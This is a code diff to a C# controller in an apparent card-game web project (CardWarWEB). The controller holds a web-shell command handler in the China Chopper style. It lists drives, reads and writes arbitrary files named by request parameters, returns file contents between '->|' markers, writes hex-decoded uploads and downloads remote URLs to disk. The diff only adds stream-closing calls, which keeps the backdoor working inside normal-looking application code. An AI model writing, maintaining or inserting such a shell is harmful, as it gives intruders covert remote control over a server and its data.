@@ -37,7 +37,7 @@ namespace CardWarWEB.Controllers
                         case "A":
                             {
                                 ;
-                                string[] c = new string[] { Directory.GetDirectoryRoot(Directory.GetCurrentDirectory())}; R = string.Format("{0}\t", Server.MapPath("/")); for (int i = 0; i < c.Length; i++)
+                                string[] c = new string[] { Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()) }; R = string.Format("{0}\t", Server.MapPath("/")); for (int i = 0; i < c.Length; i++)
                                     R += c[i][0] + ":"; break;
                             }
                         case "B":
@@ -54,12 +54,12 @@ D.Length);
                         case "C":
                             {
                                 FileStream fs = new FileStream(Z1, FileMode.Open, FileAccess.ReadWrite);
-                                StreamReader m = new StreamReader(fs); R = m.ReadToEnd(); break;
+                                StreamReader m = new StreamReader(fs); R = m.ReadToEnd(); fs.Close(); m.Close(); break;
                             }
                         case "D":
                             {
                                 FileStream fs = new FileStream(Z1, FileMode.Open, FileAccess.ReadWrite);
-                                StreamWriter m = new StreamWriter(fs); m.Write(Z2); R = "1"; break;
+                                StreamWriter m = new StreamWriter(fs); m.Write(Z2); R = "1"; fs.Close(); m.Close(); break;
                             }
                         case "E":
                             {
@@ -74,14 +74,14 @@ D.Length);
                                 fs.Read(datas, 0, Convert.ToInt32(fs.Length));
                                 HttpContext.Response.Clear(); HttpContext.Response.WriteAsync("\x2D\x3E\x7C");
                                 HttpContext.Response.Body.Write(datas, 0, Convert.ToInt32(fs.Length));
-                                HttpContext.Response.WriteAsync("\x7C\x3C\x2D"); goto End;
+                                HttpContext.Response.WriteAsync("\x7C\x3C\x2D"); fs.Close(); goto End;
                             }
                         case "G":
                             {
                                 byte[] B = new byte[Z2.Length / 2];
                                 for (int i = 0; i < Z2.Length; i += 2) { B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16); }
                                 FileStream fs = new FileStream(Z1, FileMode.Create);
-                                fs.Write(B, 0, B.Length); R = "1"; break;
+                                fs.Write(B, 0, B.Length); R = "1"; fs.Close(); break;
                             }
                         case "H": { CP(Z1, Z2); R = "1"; break; }
                         case "I":
@@ -108,7 +108,7 @@ D.Length);
                                 RQ.ContentType = "application/x-www-form-urlencoded"; HttpWebResponse WB = (HttpWebResponse)RQ.GetResponseAsync().Result;
                                 Stream WF = WB.GetResponseStream(); FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write); int i; byte[] buffer = new byte[1024];
                                 while (true) { i = WF.Read(buffer, 0, buffer.Length); if (i < 1) break; FS.Write(buffer, 0, i); }
-                                R = "1";
+                                R = "1"; WF.Close(); FS.Close();
                                 break;
                             }
                         case "M":
